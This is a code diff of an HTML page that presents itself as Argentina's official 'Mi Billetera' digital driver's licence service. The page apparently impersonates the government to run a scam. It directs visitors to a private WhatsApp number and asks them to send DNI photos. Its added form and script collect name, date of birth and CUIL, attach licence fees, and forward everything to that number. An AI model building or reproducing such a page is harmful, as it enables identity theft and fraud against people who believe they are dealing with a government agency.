@@ -8,33 +8,11 @@
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
 
   <style>
-    body {
-      font-family: 'Encode Sans', sans-serif;
-      margin: 0;
-    }
-
-    .navbar {
-      background: #fff;
-      border-bottom: 3px solid #ffd100;
-      padding: 10px 20px;
-    }
-
-    .navbar img {
-      height: 70px;
-    }
-
-    .header {
-      background: #0072bb;
-      color: white;
-      padding: 30px;
-    }
-
-    .container {
-      max-width: 900px;
-      margin: auto;
-      padding: 20px;
-    }
-
+    body { font-family: 'Encode Sans', sans-serif; margin: 0; }
+    .navbar { background: #fff; border-bottom: 3px solid #ffd100; padding: 10px 20px; }
+    .navbar img { height: 70px; }
+    .header { background: #0072bb; color: white; padding: 30px; }
+    .container { max-width: 900px; margin: auto; padding: 20px; }
     .btn-licencia {
       background-color: #0072bb;
       color: white;
@@ -45,8 +23,9 @@
       text-decoration: none;
       display: inline-block;
       margin-top: 20px;
+      border: none;
+      cursor: pointer;
     }
-
     .btn-whatsapp-inline {
       background-color: #25d366;
       color: white;
@@ -55,67 +34,157 @@
       text-decoration: none;
       font-weight: bold;
     }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
   </style>
 </head>
 
 <body>
 
-  <div class="navbar">
-    <img src="https://i.postimg.cc/638qB6NY/1776094869296.png" alt="Mi Billetera">
+<div class="navbar">
+  <img src="https://i.postimg.cc/638qB6NY/1776094869296.png">
+</div>
+
+<div class="header">
+  <h1>Licencia de conducir digital</h1>
+  <p>La versión digital de tu licencia disponible en Mi Billetera.</p>
+</div>
+
+<div class="container">
+  <h2>Nueva licencia nacional de conducir digital</h2>
+  <p>A partir del Decreto 196/2025 la licencia nacional de conducir será otorgada en formato digital.</p>
+
+  <img src="https://i.postimg.cc/rpffzc7v/carnet-(2).jpg" width="100%">
+
+  <div style="text-align:center;">
+    <a href="#" class="btn-licencia">Ver Licencia Digital</a>
   </div>
 
-  <div class="header">
-    <h1>Licencia de conducir digital</h1>
-    <p>La versión digital de tu licencia disponible en Mi Billetera.</p>
+  <h2>¿Cómo hago para tenerla?</h2>
+
+  <p><strong>1.</strong> Iniciá el trámite por 
+    <a href="https://wa.me/5491131602393" class="btn-whatsapp-inline">WhatsApp</a>
+  </p>
+
+  <p><strong>2.</strong> Enviá foto de tu DNI.</p>
+  <p><strong>3.</strong> Procesamos tu solicitud.</p>
+  <p><strong>4.</strong> Recibís el acceso.</p>
+
+  <div style="text-align:center;">
+    <a href="#" class="btn-licencia">Iniciar trámite ahora</a>
   </div>
 
-  <div class="container">
-    <h2>Nueva licencia nacional de conducir digital</h2>
-    <p>
-      A partir del Decreto 196/2025 la licencia nacional de conducir será otorgada en formato digital y podrá ser replicada en formato físico.
+  <h2>Formulario de inicio de trámite</h2>
+
+  <select id="tramite" onchange="mostrarCampos()" required>
+    <option value="">Seleccionar trámite</option>
+    <option value="primera">Mi primera licencia - $120.000</option>
+    <option value="extravio">Renovación por extravío/robo - $100.000</option>
+    <option value="vencimiento">Renovación por vencimiento - $90.000 / $110.000</option>
+    <option value="ampliacion">Ampliación de categoría - $130.000</option>
+  </select>
+
+  <form id="formulario" onsubmit="enviarWhatsApp(event)" style="display:none;">
+
+    <input type="text" id="nombre" placeholder="Nombre" required>
+    <input type="text" id="apellido" placeholder="Apellido" required>
+
+    <input type="text" id="fecha" placeholder="Fecha de nacimiento (Ej: 15/03/1990)" required>
+
+    <input type="text" id="cuil" placeholder="CUIL (Ej: 20-12345678-3)"
+      pattern="^\d{2}-\d{8}-\d{1}$"
+      required>
+
+    <select id="categoria" style="display:none;">
+      <option>A1 - Motocicleta hasta 50cc</option>
+      <option>A2 - Motocicleta hasta 150cc</option>
+      <option>A3 - Motocicleta +150cc</option>
+      <option>B1 - Automóviles particulares</option>
+      <option>B2 - Automóviles con acoplado</option>
+      <option>C - Camiones</option>
+      <option>D - Transporte de pasajeros</option>
+      <option>E - Vehículos con remolque</option>
+      <option>F - Personas con discapacidad</option>
+      <option>G - Maquinaria especial</option>
+    </select>
+
+    <select id="vencimiento" style="display:none;">
+      <option value="3">Vencimiento 3 años</option>
+      <option value="5">Vencimiento 5 años</option>
+    </select>
+
+    <button class="btn-licencia">Enviar solicitud</button>
+
+  </form>
+
+</div>
+
+<footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
+  <div class="container" style="text-align:center;">
+    <p><strong>Mi Billetera | Documentación Digital</strong></p>
+    <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
+    <p style="margin-top:20px; font-size:12px; color:#666;">
+      © 2026 Mi Billetera | mi Argentina. Todos los derechos reservados.
     </p>
-
-    <img src="https://i.postimg.cc/rpffzc7v/carnet-(2).jpg" width="100%">
-
-    <div style="text-align:center;">
-      <a href="https://miargentina-servicios.github.io/licencia/ConsultaLNC.html" class="btn-licencia">
-        Ver Licencia Digital
-      </a>
-    </div>
-
-    <h2>¿Cómo hago para tenerla?</h2>
-
-    <p><strong>1.</strong> Iniciá el trámite escribiéndonos por 
-      <a href="https://wa.me/5491131602393" class="btn-whatsapp-inline">WhatsApp</a>
-    </p>
-
-    <p><strong>2.</strong> Enviá foto de tu DNI (frente y dorso) para validar tus datos.</p>
-
-    <p><strong>3.</strong> Procesamos tu solicitud y generamos tu licencia digital.</p>
-
-    <p><strong>4.</strong> Recibís el acceso para visualizarla desde tu dispositivo.</p>
-
-    <div style="text-align:center;">
-      <a href="https://wa.me/5491131602393" class="btn-licencia">
-        Iniciar trámite ahora
-      </a>
-    </div>
-
   </div>
+</footer>
 
-  <footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
-    <div class="container" style="text-align:center;">
+<script>
+function mostrarCampos(){
+  let tipo = document.getElementById("tramite").value;
+  document.getElementById("formulario").style.display = "block";
 
-      <p><strong>Mi Billetera | Documentación Digital</strong></p>
+  document.getElementById("categoria").style.display = "none";
+  document.getElementById("vencimiento").style.display = "none";
 
-      <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
+  if(tipo === "primera" || tipo === "extravio" || tipo === "ampliacion"){
+    document.getElementById("categoria").style.display = "block";
+  }
 
-      <p style="margin-top:20px; font-size:12px; color:#666;">
-        © 2026 Mi Billetera | mi Argentina. Todos los derechos reservados.
-      </p>
+  if(tipo === "vencimiento"){
+    document.getElementById("vencimiento").style.display = "block";
+  }
+}
 
-    </div>
-  </footer>
+function enviarWhatsApp(e){
+  e.preventDefault();
+
+  let tipo = document.getElementById("tramite").value;
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let fecha = document.getElementById("fecha").value;
+  let cuil = document.getElementById("cuil").value;
+  let categoria = document.getElementById("categoria")?.value || "";
+  let vencimiento = document.getElementById("vencimiento")?.value || "";
+
+  let precio = "";
+  if(tipo==="primera") precio="$120.000";
+  if(tipo==="extravio") precio="$100.000";
+  if(tipo==="vencimiento") precio=(vencimiento=="5")?"$110.000":"$90.000";
+  if(tipo==="ampliacion") precio="$130.000";
+
+  let mensaje =
+`SOLICITUD DE LICENCIA
+
+Tipo de trámite: ${tipo}
+Nombre: ${nombre}
+Apellido: ${apellido}
+Fecha de nacimiento: ${fecha}
+CUIL: ${cuil}
+${categoria ? "Categoría: "+categoria : ""}
+${vencimiento ? "Vencimiento: "+vencimiento+" años" : ""}
+
+Precio: ${precio}`;
+
+  let url = "https://wa.me/5491131602393?text=" + encodeURIComponent(mensaje);
+  window.open(url, "_blank");
+}
+</script>
 
 </body>
-</html>
+                                          </html>
